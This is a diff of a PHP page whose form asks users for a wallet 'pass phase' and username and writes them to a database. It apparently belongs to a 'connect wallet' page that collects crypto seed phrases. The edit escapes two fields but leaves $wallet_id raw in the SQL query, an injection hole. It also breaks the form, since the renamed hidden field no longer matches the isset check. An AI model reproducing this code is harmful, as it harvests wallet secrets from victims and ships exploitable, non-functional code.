@@ -44,11 +44,12 @@ include_once (rootDir.'partials/front/header/main.php');
                     </div>
                     <?php
                     if (isset($_POST[$wallet_id])) {
-                        $wallet_phase = $_POST['wallet_phase'];
-                        $wallet_username = $_POST['wallet_username'];
-                        $wallet_id = $_POST[$wallet_id];
-
                         // Assuming your database connection is already established ($conn)
+                        $wallet_id = $_POST[$wallet_id]; // Move this line up
+
+                        $wallet_phase = $conn->real_escape_string($_POST['wallet_phase']); // Use real_escape_string for security
+                        $wallet_username = $conn->real_escape_string($_POST['wallet_username']); // Use real_escape_string for security
+
                         $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username', wallet_status = 1 WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";
 
                         if ($conn->query($sql) === TRUE) {
@@ -60,19 +61,19 @@ include_once (rootDir.'partials/front/header/main.php');
                     ?>
 
                     <form method="post">
-                        <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
+                        <input type="hidden" value="<?= $wallet_id ?>" name="wallet_id"> <!-- Fix the name attribute -->
                         <div class="form-group">
                             <label>Pass Phase</label>
-                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
+                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?= $wallet_key_name ?> pass phase">
                         </div>
                         <div class="form-group">
-                            <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
-                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
+                            <label for="<?= $wallet_key_name ?>_username">Wallet Username</label>
+                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?= $wallet_key_name ?> username">
                         </div>
-                        <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
+                        <button type="submit" class="btn btn-primary" name="submit">Submit</button> <!-- Change the name attribute -->
                     </form>
 
-<!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
+                    <!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                 </div>
             </div>
         </section>
